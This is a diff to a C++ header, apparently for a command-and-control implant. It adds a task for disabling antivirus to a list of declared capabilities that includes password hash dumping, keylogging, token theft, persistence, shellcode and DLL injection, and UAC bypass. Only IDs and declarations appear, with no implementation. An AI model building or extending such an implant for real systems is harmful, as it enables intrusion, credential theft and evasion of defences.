@@ -23,13 +23,13 @@
 #include <string>
 #include <vector>
 
-// For the 'ip' task
+// For 'ip' task
 #define MAX_TRIES 3
 #define WORKING_BUFFER_SIZE 15000
-// For the 'reg' task
+// For 'reg' task
 #define BUFFER_SIZE 8192
 #define MAX_REG_KEY_LENGTH 255
-// For the 'screenshot' task
+// For 'screenshot' task
 #define IDS_APP_TITLE 1
 #define IDC_GDICAPTURINGANIMAGE 1
 #define IDI_GDICAPTURINGANIMAGE 2
@@ -43,46 +43,47 @@
 #define TASK_CMD                0x04
 #define TASK_CONNECT            0x05
 #define TASK_CP                 0x06
-#define TASK_DLL                0x07
-#define TASK_DOWNLOAD           0x08
-#define TASK_ENV_LS             0x09
-#define TASK_FIND               0x10
-#define TASK_GROUP_LS           0x11
-#define TASK_HASHDUMP           0x12
-#define TASK_HISTORY            0x13
-#define TASK_IP                 0x14
-#define TASK_JITTER             0x15
-#define TASK_KEYLOG             0x16
-#define TASK_KILL               0x17
-#define TASK_KILLDATE           0x18
-#define TASK_LS                 0x19
-#define TASK_MIGRATE            0x20
-#define TASK_MKDIR              0x21
-#define TASK_MV                 0x22
-#define TASK_NET                0x23
-#define TASK_PE                 0x24
-#define TASK_PERSIST            0x25
-#define TASK_PROCDUMP           0x26
-#define TASK_PS_KILL            0x27
-#define TASK_PS_LS              0x28
-#define TASK_PWD                0x29
-#define TASK_REG_QUERY          0x30
-#define TASK_RM                 0x31
-#define TASK_RMDIR              0x32
-#define TASK_RPORTFWD_ADD       0x33
-#define TASK_RPORTFWD_LS        0x34
-#define TASK_RPORTFWD_RM        0x35
-#define TASK_RUNAS              0x36
-#define TASK_SCREENSHOT         0x37
-#define TASK_SHELLCODE          0x38
-#define TASK_SLEEP              0x39
-#define TASK_TOKEN_REVERT       0x40
-#define TASK_TOKEN_STEAL        0x41
-#define TASK_UAC                0x42
-#define TASK_UPLOAD             0x43
-#define TASK_USER_LS            0x44
-#define TASK_WHOAMI             0x45
-#define TASK_WHOAMI_PRIV        0x46
+#define TASK_DISABLE_AV         0x07
+#define TASK_DLL                0x08
+#define TASK_DOWNLOAD           0x09
+#define TASK_ENV_LS             0x10
+#define TASK_FIND               0x11
+#define TASK_GROUP_LS           0x12
+#define TASK_HASHDUMP           0x13
+#define TASK_HISTORY            0x14
+#define TASK_IP                 0x15
+#define TASK_JITTER             0x16
+#define TASK_KEYLOG             0x17
+#define TASK_KILL               0x18
+#define TASK_KILLDATE           0x19
+#define TASK_LS                 0x20
+#define TASK_MIGRATE            0x21
+#define TASK_MKDIR              0x22
+#define TASK_MV                 0x23
+#define TASK_NET                0x24
+#define TASK_PE                 0x25
+#define TASK_PERSIST            0x26
+#define TASK_PROCDUMP           0x27
+#define TASK_PS_KILL            0x28
+#define TASK_PS_LS              0x29
+#define TASK_PWD                0x30
+#define TASK_REG_QUERY          0x31
+#define TASK_RM                 0x32
+#define TASK_RMDIR              0x33
+#define TASK_RPORTFWD_ADD       0x34
+#define TASK_RPORTFWD_LS        0x35
+#define TASK_RPORTFWD_RM        0x36
+#define TASK_RUNAS              0x37
+#define TASK_SCREENSHOT         0x38
+#define TASK_SHELLCODE          0x39
+#define TASK_SLEEP              0x40
+#define TASK_TOKEN_REVERT       0x41
+#define TASK_TOKEN_STEAL        0x42
+#define TASK_UAC                0x43
+#define TASK_UPLOAD             0x44
+#define TASK_USER_LS            0x45
+#define TASK_WHOAMI             0x46
+#define TASK_WHOAMI_PRIV        0x47
 
 namespace Task
 {
@@ -139,6 +140,7 @@ namespace Task
     std::wstring Cmd(State::PSTATE pState, const std::wstring& wCmd);
     std::wstring Connect(State::PSTATE pState, const std::wstring& wListenerURL);
     std::wstring Cp(State::PSTATE pState, const std::wstring& wSrc, const std::wstring& wDest);
+    std::wstring DisableAV(State::PSTATE pState);
     std::wstring Dll(State::PSTATE pState, const std::wstring& wPid, const std::wstring& wSrc, const std::wstring& wTechnique);
     std::wstring Download(State::PSTATE pState, const std::wstring& wSrc, const std::wstring& wDest);
     std::wstring EnvLs(State::PSTATE pState);
